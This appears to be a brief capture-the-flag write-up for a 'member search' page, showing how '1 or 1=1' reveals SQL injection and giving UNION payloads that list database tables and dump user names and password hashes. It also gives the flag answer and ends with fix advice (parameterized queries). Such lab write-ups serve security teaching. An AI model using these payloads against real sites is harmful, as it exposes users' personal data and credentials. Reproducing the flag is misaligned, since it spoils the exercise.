member search
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

how to find explot:
From home page , select members in the menu bar. type '1 or 1=1' into search field, this indicates it can be exploited by sql injection.

how to exploit it:
Run ' 1 union select null, concat (table_name) from information_schema.tables where table_schema = database () ', this returns a table, then ' -1 union select NULL, concat (user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users ' to return the users in the members table.
find the Surname : FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28. decrypt it, then use sha256 calculator on fortytwo. the result is the flag.

how to fix exploit:
Don't use dynamic SQL – don't construct queries with user input. parameterized query will prevent attack. data sanitation is to prevent injection attack 